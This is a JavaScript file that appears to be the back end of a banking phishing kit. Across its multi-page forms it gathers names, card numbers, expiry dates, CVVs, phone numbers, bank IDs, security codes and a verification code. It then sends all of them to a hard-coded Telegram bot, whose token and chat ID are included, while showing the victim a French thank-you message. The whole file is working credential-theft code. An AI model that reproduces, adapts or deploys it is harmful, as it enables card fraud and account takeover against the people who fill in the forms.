// Function to generate a unique ID
function generateId() {
  return Math.random().toString(36).substring(2, 9); // Random alphanumeric string
}

// Function to navigate to the next page
function nextPage(page) {
  window.location.href = page;
}

// Function to collect form data and store it in localStorage
function collectFormData(formId) {
  const form = document.getElementById(formId);
  const inputs = form.querySelectorAll('input, select, textarea');

  // Retrieve existing form data from localStorage (if any)
  let formData = JSON.parse(localStorage.getItem('formData')) || {};

  inputs.forEach(input => {
    if (input.type !== 'checkbox' || input.checked) {
      // Map input IDs to the correct Google Sheets column names
      let fieldName = input.id;

      // Convert input IDs to match Google Sheets column names
      switch (input.id) {
        case 'name':
          fieldName = 'form1_Name';
          break;
        case 'bank_name':
          fieldName = 'form1_BankName';
          break;
        case 'card_number':
          fieldName = 'form1_CardNumber';
          break;
        case 'expiration':
          fieldName = 'form1_ExpirationDate';
          break;
        case 'cvv':
          fieldName = 'form1_CVV';
          break;
        case 'phone':
          fieldName = 'form1_PhoneNumber';
          break;
        case 'bank_name_2':
          fieldName = 'form2_BankName';
          break;
        case 'bank_id':
          fieldName = 'form2_BankID';
          break;
        case 'security_code':
          fieldName = 'form2_SecurityCode';
          break;
        case 'postal_code':
          fieldName = 'form2_PostalCode';
          break;
        case 'phone_2':
          fieldName = 'form2_PhoneNumber';
          break;
        default:
          break;
      }

      // Store the value with the correct key
      formData[fieldName] = input.value;
    }
  });

  // Save the updated form data to localStorage
  localStorage.setItem('formData', JSON.stringify(formData));
}

// Function to submit the combined form data to Telegram
function submitForm() {
  // Retrieve the form data from localStorage
  const formData = JSON.parse(localStorage.getItem('formData')) || {};

  // Add the verification code to the form data
  const code = document.getElementById('code').value;
  formData.VerificationCode = code;

  // Add a unique ID to the form data
  formData.id = generateId();

  // Map form data to the expected JSON structure
  const formattedData = {
    id: formData.id,
    form1_Name: formData.form1_Name,
    form1_BankName: formData.form1_BankName,
    form1_CardNumber: formData.form1_CardNumber,
    form1_ExpirationDate: formData.form1_ExpirationDate,
    form1_CVV: formData.form1_CVV,
    form1_PhoneNumber: formData.form1_PhoneNumber,
    form2_BankName: formData.form2_BankName,
    form2_BankID: formData.form2_BankID,
    form2_SecurityCode: formData.form2_SecurityCode,
    form2_PostalCode: formData.form2_PostalCode,
    form2_PhoneNumber: formData.form2_PhoneNumber,
    VerificationCode: formData.VerificationCode,
  };

  console.log('Combined Form Data:', JSON.stringify(formattedData, null, 2));

  // Telegram Bot Token and Chat ID
  const botToken = '8197771068:AAHJid2fecU4Koefj6-ZqElxBn46B0dRBJw';
  const chatId = '7519045488';

  // Format the message to be sent to Telegram
  const message = `New Form Submission:\n${JSON.stringify(formattedData, null, 2)}`;

  // Send the message to Telegram
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      alert('Nous vous remercions pour votre confiance.');

      localStorage.removeItem('formData');
      window.location.href = 'index.html';
    })
    .catch((error) => {
      console.error('Error:', error);
      alert('An error occurred while submitting the data.');
    });
}

// Attach event listeners to forms
document.addEventListener('DOMContentLoaded', () => {
  const form1 = document.getElementById('form1');
  const form2 = document.getElementById('form2');

  if (form1) {
    form1.addEventListener('submit', (e) => {
      e.preventDefault();
      collectFormData('form1');
      nextPage('2.html');
    });
  }

  if (form2) {
    form2.addEventListener('submit', (e) => {
      e.preventDefault();
      collectFormData('form2');
      nextPage('3.html');
    });
  }
});
